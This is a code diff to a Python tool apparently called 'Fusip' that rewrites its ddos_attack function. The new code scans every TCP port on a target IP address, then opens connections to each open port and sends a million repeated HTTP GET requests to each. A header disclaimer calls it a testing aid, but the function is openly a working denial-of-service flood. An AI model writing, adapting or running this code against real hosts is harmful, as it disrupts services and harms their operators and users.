@@ -14,8 +14,9 @@ import ipaddress
 # Welcome developers to my first project: Fusip.
 # I hope this will assist you in your testing.
 # Unauthorized use for malicious purposes is strictly prohibited; I hold no responsibility for such actions.
-# Here is my GitHub repository: https://github.com/Gekiidoo.
-# Feel free to evaluate my projects and join my Discord community: https://discord.gg/aWBk7j64K3.
+# Here is my GitHub repository: https://github.com/Gekiidoo .
+# Here is my discord : https://discord.gg/SrJgUTQcAH .
+
 
 # Function to check if the API key is valid
 def check_api_key(api_key):
@@ -177,27 +178,47 @@ send_email(ip_address)
 
 # Function to perform DDOS attack
 def ddos_attack(ip_address, queue, max_attempts=3):
-    attempts = 0
-    connected = False
-    while attempts < max_attempts:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((ip_address, 80))
-            # More intensive HTTP request
-            request = b"GET / HTTP/1.1\r\nHost: " + ip_address.encode() + b"\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n\r\n"
-            s.send(request)
-            print(f"\033[94mRequest sent to {ip_address}\033[0m")
-            connected = True
-            return
-        except Exception as e:
-            print(f"\033[94mError in connection: {e}\033[0m")
-            time.sleep(5)
-            attempts += 1
-        finally:
-            s.close()
-    if connected:
-        print(f"\033[94mConnected to {ip_address}\033[0m")
-    queue.task_done()
+    open_ports = []
+    
+    # Analyze open ports
+    for port in range(1, 65536):  # Range of possible port numbers
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.1)  # Set a timeout for connection attempt
+        result = sock.connect_ex((ip_address, port))  # Check if the port is open
+        if result == 0:  # If connection successful, port is open
+            open_ports.append(port)
+        sock.close()
+    
+    print(f"\033[94mOpen ports on {ip_address}: {open_ports}\033[0m")
+    
+    if not open_ports:
+        print("\033[94mNo open ports found. Exiting DDOS attack.\033[0m")
+        return
+    
+    # Launch DDOS attack on all open ports
+    for port in open_ports:
+        attempts = 0
+        connected = False
+        while attempts < max_attempts:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                s.connect((ip_address, port))
+                # Send millions of requests
+                for _ in range(1000000):
+                    request = b"GET / HTTP/1.1\r\nHost: " + ip_address.encode() + b"\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n\r\n"
+                    s.send(request)
+                print(f"\033[94mMillions of requests sent to {ip_address}:{port}\033[0m")
+                connected = True
+                break
+            except Exception as e:
+                print(f"\033[94mError in connection: {e}\033[0m")
+                time.sleep(5)
+                attempts += 1
+            finally:
+                s.close()
+        if connected:
+            print(f"\033[94mConnected to {ip_address}:{port}\033[0m")
+        queue.task_done()
 
 # Function to initiate DDOS attack
 def ipddos():
